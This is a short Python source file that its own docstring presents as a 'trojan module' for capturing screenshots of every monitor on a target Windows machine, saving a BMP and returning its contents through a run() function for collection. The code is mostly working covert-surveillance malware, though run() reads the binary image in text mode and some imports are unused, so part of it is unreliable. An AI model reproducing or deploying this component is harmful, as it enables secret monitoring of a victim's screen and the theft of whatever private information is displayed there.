'''
This is a trojan module that can take screenshots of the entire screen on the target machine.
This module has successfully been tested on Windows 10.0.19045 Build 19045. The resultant screenshot will be found in the working directory as a BMP file.
'''

import base64
from webbrowser import get
import win32api
import win32con
import win32gui
import win32ui

def get_dimensions():                                                   # determining the size of the screen(s) so that the screenshot dimensions are known
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot(name='screenshot'):
    hdesktop = win32gui.GetDesktopWindow()              # acquire a handle to the entire desktop (all monitors are included)
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)         # create a device context from a handle to the desktop
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()                # create a memory based device context to store the bitmap bytes before writing to disk

    screenshot = win32ui.CreateBitmap()                             # now we create the bitmap object set to the device context of the desktop
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)                                                     # make the memory based device context point at the bitmap object being captured
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)        # store a bit for bit copy of the taken image in the memory based context
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')                                # finally, we write the image to disk

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def run():
    screenshot()
    with open('screenshot.bmp') as f:
        img = f.read()
    return img

if __name__ == "__main__":
    screenshot()